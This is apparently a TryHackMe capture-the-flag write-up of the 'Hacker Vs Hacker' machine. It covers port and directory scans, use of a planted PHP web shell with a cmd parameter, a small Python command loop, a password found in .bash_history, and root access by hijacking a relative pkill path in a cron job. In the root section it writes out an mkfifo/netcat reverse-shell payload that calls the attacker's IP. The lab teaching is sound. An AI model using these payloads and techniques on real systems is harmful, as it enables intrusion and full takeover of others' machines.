---
title: "Tryhackme Hacker Vs Hacker writeup"
date: 2022-08-15 20:00:00 
layout: post
categories: thm
tags: [thm]
toc: true
---

# Machine : Hacker Vs. Hacker

### Writeup status: Completed.

## Enumeration

### Port Scan

- Rustscan results

```bash

└─[$] rustscan -t 2000 -a 10.10.33.194 -- -sC -sV                                                                                                                                 
-----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
0day was here ♥

[~] The config file is expected to be at "/home/dragon/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.33.194:22
Open 10.10.33.194:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sC -sV" on ip 10.10.33.194
Depending on the complexity of the script, results may take some time to appear.
[~] Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-16 15:36 IST

<<--SNIP-->>

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 9f:a6:01:53:92:3a:1d:ba:d7:18:18:5c:0d:8e:92:2c (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDEwViZRbXUs9kag3j00D1FtRrtg3PKTSXGdTaJC14E+FWVLUKxlCTbI89GtFCqL22nDVi3nmG5QQDxEfl4zTOIgZXi4FXst0ZfzMayH8T+t9jSc2OlCuIyZYyw+JDP2G+WJXHC67BSthXTt9eMeDPxi7r03GA0nqMSFJ8lw5FqTnzyacLne5ojiB/atnHpVXa0DoSmT+w8t1Pk3nhnk0zrlOxVOfkx8Jze8NHynP4BFr/Ea3PNvvmJ2hpRUgO3IGVQ3bt55ab3ZoFy344Fy5ISsYXYQJBeLUhu2GVeCihzgUFkecKZEUhnc0S8Idy5EnDWeEaRQjE832gKvUJ9d0PIEN8sTxgSEp1RcijMm8/2vEWzeRVAKaHCaU8lV/jbtyl6s5jgkStuy6NwqpWf24D0TydU5jwsjGTLWJbrDNsYbP28qas0o2+zwmzqwaOJMwuk0CYVZCcd2qGVRRxYu6NhfIudRPMLPp/EvhfEUPoYR6tmX42pvpqNH70kotCiQiM=
|   256 4b:60:dc:fb:92:a8:6f:fc:74:53:64:c1:8c:bd:de:7c (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMZXOzdGFYNrQPBrILKG3Zd+DlWWE133ONnKOGm3MhuTgWZjEkYI1g5pn6ggVCnJwZHgvkvjSudcCImNk92yW7g=
|   256 83:d4:9c:d0:90:36:ce:83:f7:c7:53:30:28:df:c3:d5 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEznWyrDbdSTIAxhoKlcRP8mZ/LX/wQSAvofU1MLracp
80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-favicon: Unknown favicon MD5: DD1493059959BA895A46C026C39C36EF
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: RecruitSec: Industry Leading Infosec Recruitment
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

<<--SNIP-->>
ead data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.48 seconds


```

- There are 2 ports open 22 and 80

### Homepage

![homepage](https://github.com/heapbytes/tryhackme-writeups/blob/main/hacker_VS_hacker/Machine-homepage.png)

### Directory Scanning

```bash

<Del>└─[$] ffuf -u http://10.10.33.194/FUZZ -w ~/wordlists/directory/directory-list-2.3-medium.txt                                                                                      [15:46:18]

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.33.194/FUZZ
 :: Wordlist         : FUZZ: /home/dragon/wordlists/directory/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

images                  [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 171ms]
css                     [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 139ms]
cvs                     [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 138ms]
dist                    [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 139ms]
server-status           [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 158ms]

:: Progress: [220560/220560] :: Job [1/1] :: 249 req/sec :: Duration: [0:17:29] :: Errors: 0 ::

```

- Seeing all those directory nothing found to be useful

- After uploading a pdf file in the upload section we can see the source code in intercepted request

```html

HTTP/1.1 200 OK
Date: Tue, 16 Aug 2022 10:55:12 GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 552
Connection: close
Content-Type: text/html; charset=UTF-8


Hacked! If you dont want me to upload my shell, do better at filtering!

<!-- seriously, dumb stuff:

$target_dir = "cvs/";
$target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);

if (!strpos($target_file, ".pdf")) {
  echo "Only PDF CVs are accepted.";
} else if (file_exists($target_file)) {
  echo "This CV has already been uploaded!";
} else if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
  echo "Success! We will get back to you.";
} else {
  echo "Something went wrong :|";
}

-->

```

- I tried to upload a pdf file but it returned the same response which made me think that the hacker must have used the same technique to bypass the filteration and got the shell onto the servers, which means that the hacker has a shell/payload on the server which we can use and get a shell.

- As the server uses `PHP` and we saw the source code as well, the upload program uses `strpos()` so, as long the filename has `.php` in it we are good to go.

- I fuzzed the `/cvs` with guessing the extension `.pdf.php` 

- gobuster results

```bash

└─[$] gobuster dir -u http://10.10.117.45/cvs/ -w ~/wordlists/directory/directory-list-2.3-small.txt -x .pdf.php -t 50                                                            

===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.117.45/cvs/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /home/dragon/wordlists/directory/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              pdf.php
[+] Timeout:                 10s
===============================================================
2022/08/16 16:55:10 Starting gobuster in directory enumeration mode
===============================================================
/shell.pdf.php        (Status: 200) [Size: 18]
Progress: 12400 / 175330 (7.07%)             
Progress: 12442 / 175330 (7.10%)             ^C
[!] Keyboard interrupt detected, terminating.
                                              
===============================================================

```

- `shell.pdf.php` seems intresting, 

```bash

└─[$] curl 10.10.117.45/cvs/shell.pdf.php                                                                                                                                         
<pre></pre>
boom!%                                                                                                                                                                                             

```

- Just as I expected, this php file was used by the hackers to get shell on the servers.

- After trying for a while, i fount it uses `cmd` as it's parameter

```bash

└─[$] curl http://10.10.117.45/cvs/shell.pdf.php\?cmd\=id                                                                                                                        

<pre>uid=33(www-data) gid=33(www-data) groups=33(www-data)
</pre>
boom!%

```

- Voila we can now execute commands and get the user shell

- After trying to get revshell everytime the server send `nope` after we got a shell

```bash

└─[$] nc -nvlp 9001                 
Connection from 10.10.117.45:52160
$ whoami
nope
read(net): Connection reset by peer


└─[$] nc -nvlp 9001                 
Connection from 10.10.117.45:52162
$ ls
nope

```


- I developed a custom py exploit for temp shell till we get the user shell.

```py

import requests

url = 'http://10.10.117.45/cvs/shell.pdf.php/?cmd='
cmd = ''

while(cmd != 'exit'):
    cmd = input('command>')
    r = requests.get(url + cmd)
    print(r.text[5:-14], '\n')

```

- After searching for a while i found `lachlan's` password in the `.bash_history` but unfortunately it gave same response `nope`.

```bash

command>cat /home/lachlan/.bash_history
./cve.sh
./cve-patch.sh
vi /etc/cron.d/persistence
echo -e "dHY5pzmNYoETv7SUaY\nthisistheway123\nthisistheway123" | passwd
ls -sf /dev/null /home/lachlan/.bash_history 


```

- Trying to ssh

```bash

└─[$] ssh lachlan@10.10.117.45                                                                                                                                       

The authenticity of host '10.10.117.45 (10.10.117.45)' can't be established.
ED25519 key fingerprint is SHA256:2RN2fsvo4NewQ4PV/D/U+gbDQND2ckUUnofzShfqqJk.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.117.45' (ED25519) to the list of known hosts.
lachlan@10.10.117.45's password: 
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-109-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue 16 Aug 2022 11:57:49 AM UTC

  System load:  0.24              Processes:             121
  Usage of /:   25.6% of 9.78GB   Users logged in:       0
  Memory usage: 52%               IPv4 address for eth0: 10.10.117.45
  Swap usage:   0%


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Thu May  5 04:39:19 2022 from 192.168.56.1
$ nope
Connection to 10.10.117.45 closed.


```

- let's check out the file hackers might have edited that we noticed in the `.bash_history`

```bash

command>cat /etc/cron.d/persistence
PATH=/home/lachlan/bin:/bin:/usr/bin
# * * * * * root backup.sh
* * * * * root /bin/sleep 1  && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
* * * * * root /bin/sleep 11 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
* * * * * root /bin/sleep 21 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
* * * * * root /bin/sleep 31 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
* * * * * root /bin/sleep 41 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
* * * * * root /bin/sleep 51 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done

```

- As you can see the cronjob runs after every 10 seconds and echo's `nope` in `/dev/pts`

- what is /dev/pts?
   - Consider as this file contains data of the current terminal

- For better understanding you can type `tty` in your current shell and type `echo hello > /dev/pts/<shell_no>` in a new shell and you can see the hello on your current shell.

![demo](https://github.com/heapbytes/tryhackme-writeups/blob/main/hacker_VS_hacker/demo.png)

- Hmmmm, what next?
- Now as we can see the `$PATH` variable is declared inside the cron file... 
   - `PATH=/home/lachlan/bin:/bin:/usr/bin`
- So first the binaries will checkout in `/home/lachlan/bin` then `/bin` followed by `/usr/bin`

## User Shell

- As all the binary in the cronjob use absolute paht `pkill` is using relative path, that means if we create a binary named `pkill` in our `home` directory we can bypass it's effects.

- Editing the pkill will get us a stable shell.

```bash

└─[$] ssh lachlan@10.10.19.188 'echo "hi" > ./bin/pkill && chmod +x ./bin/pkill'  
lachlan@10.10.19.188's password: 

```

- We can check if the file is created or not with out temp shell

```bash

└─[$] python3 tempShell.py

command>ls -la /home/lachlan/bin
total 16
drwxr-xr-x 2 lachlan lachlan 4096 Aug 16 13:56 .
drwxr-xr-x 4 lachlan lachlan 4096 May  5 04:39 ..
-rw-r--r-- 1 lachlan lachlan   56 May  5 04:38 backup.sh
-rwxrwxr-x 1 lachlan lachlan    3 Aug 16 13:58 pkill 

command>cat /home/lachlan/bin/pkill
hi 

```

- As we can see we have successfully edited the pkill
- Lets try for the shell

```bash

└─[$] ssh lachlan@10.10.19.188                                                                                                                                                    

lachlan@10.10.19.188's password: 
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-109-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue 16 Aug 2022 02:01:14 PM UTC

  System load:  0.29              Processes:             126
  Usage of /:   25.0% of 9.78GB   Users logged in:       0
  Memory usage: 48%               IPv4 address for eth0: 10.10.19.188
  Swap usage:   0%


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Thu May  5 04:39:19 2022 from 192.168.56.1
$ bash
lachlan@b2r:~$ 
lachlan@b2r:~$ id
uid=1001(lachlan) gid=1001(lachlan) groups=1001(lachlan)
lachlan@b2r:~$ nope

lachlan@b2r:~$ 

```

- We still have echo `nope` but we the shell remains.

## Root shell

- As the pkill and other cronjob service runs after every 10 seconds with `root` privileges we can edit `./bin/pkill` and get the `root shell`.

- Editing and adding revshell payload inside `/home/lachlan/bin/pkill`

   - `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.8.237.225 4444 >/tmp/f`

- Start the netcat and wait for 10 seconds to get root shell

#### Payload

```bash

lachlan@b2r:~/bin$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.8.237.225 4444 >/tmp/f" > pkill

lachlan@b2r:~/bin$ cat pkill 
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.8.237.225 4444 >/tmp/f

```

#### Shell

- We now get root shell on our netcat.

```bash

└─[$] nc -nvlp 4444                                                                                                                                                          
Connection from 10.10.19.188:36670
sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# 
```

# --- MACHINE ROOTED ---

